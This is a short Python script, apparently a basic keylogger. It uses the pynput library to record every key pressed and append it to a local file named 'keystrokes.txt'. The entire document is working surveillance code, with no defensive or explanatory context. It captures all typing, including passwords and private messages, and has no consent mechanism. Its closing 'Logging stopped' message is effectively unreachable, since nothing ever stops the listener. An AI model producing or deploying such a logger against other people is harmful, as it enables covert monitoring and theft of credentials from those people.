from pynput.keyboard import Listener, Key

# Define the file to store keystrokes
filename = "keystrokes.txt"

# Function to handle key presses
def on_press(key):
  # Filter special keys (like function keys)
  if isinstance(key, Key):
    key = str(key).replace("Key.", "")
  # Log the key to the file
  with open(filename, "a") as file:
    file.write(f"{key}")

# Start listening for key presses
with Listener(on_press=on_press) as listener:
  listener.join()

print("Logging stopped. Keystrokes saved to", filename)
